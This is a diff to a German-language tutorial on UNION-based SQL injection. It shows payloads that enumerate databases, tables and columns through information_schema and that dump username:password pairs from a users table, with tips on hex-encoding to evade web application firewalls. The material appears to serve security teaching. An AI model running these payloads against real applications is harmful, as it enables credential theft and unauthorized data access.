@@ -138,10 +138,6 @@ Nachdem die verwundbare Spalte identifiziert wurde (im Beispiel: Spalte 3), kann
 > **Wichtig:** Wir nutzen die information_schema, eine systemeigene Datenbank (primär in MySQL), die Metadaten über alle anderen Datenbanken, Tabellen, Spalten und Zugriffsrechte speichert.
 
 
-- **`group_concat():`** Fasst mehrere Zeilen zu einem einzigen String zusammen. Dies ist essentiell, da die Webanwendung oft nur die erste Ergebniszeile ausgibt.
-
-- **Hex-Kodierung (0x...):** Die Hexadezimaldarstellung (z.B. `0x3a3a` für `::` als Trennzeichen) kann helfen, wenn Web Application Firewalls (WAFs) oder spezifisches Escaping Klartext-Strings wie `'::'` filtern würden.
-
 ### Beispielhafte Schritte zur Datenextraktion mit `GROUP_CONCAT`
 
 1. **Test auf Verwundbarkeit mit UNION SELECT**
@@ -152,30 +148,39 @@ test' UNION SELECT 1,2,3 FROM table_name --
 2. **Schemas (Datenbanken) anzeigen:**
 ```sql
 test' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata --
+
+test' UNION SELECT NULL, NULL, group_concat(schema_name) FROM information_schema.schemata --
 ```
 
 3. **Tabellennamen der aktuellen Datenbank anzeigen:**
 ```sql
-test' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata --
+test' UNION SELECT NULL, NULL, group_concat(table_name), NULL FROM information_schema.tables WHERE table_schema=database() --
 ```
 
 4. **Spaltennamen aus einer bestimmten Tabelle anzeigen (Klartextname):**
 ```sql
 test' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' --
+
+test' UNION SELECT NULL, NULL, group_concat(column_name), NULL FROM information_schema.columns WHERE table_name='users' --
 ```
 
 5. **Spaltennamen anzeigen mit Hex-Wert für Tabellenname (Bypass & Genauigkeit):**
 ```sql
 test' UNION SELECT 1,2,3,4,group_concat(column_name),6 FROM information_schema.columns WHERE table_name=0x7573657273 --
-```
 
-💡 `users` in Hex: 0x7573657273
-Tool für Umwandlung: [Codebeautify – String to Hex](https://codebeautify.org/string-hex-converter)
+test' UNION SELECT NULL, NULL, group_concat(username,0x3a3a,password), NULL FROM users --
+```
+- `users` in Hex: 0x7573657273
+- **Tool für Umwandlung:** [Codebeautify – String to Hex](https://codebeautify.org/string-hex-converter)
 
 6. **Nutzerdaten ausgeben (z.B. Username & Passwort):**
 ```sql
 test' UNION SELECT 1,group_concat(username,0x3a3a,password),3 FROM users --
 ```
+
+- **`group_concat():`** Fasst mehrere Zeilen zu einem einzigen String zusammen. Dies ist essentiell, da die Webanwendung oft nur die erste Ergebniszeile ausgibt.
+
+- **Hex-Kodierung (0x...):** Die Hexadezimaldarstellung (z.B. `0x3a3a` für `::` als Trennzeichen) kann helfen, wenn Web Application Firewalls (WAFs) oder spezifisches Escaping Klartext-Strings wie `'::'` filtern würden.
 
 
 <div align=right>
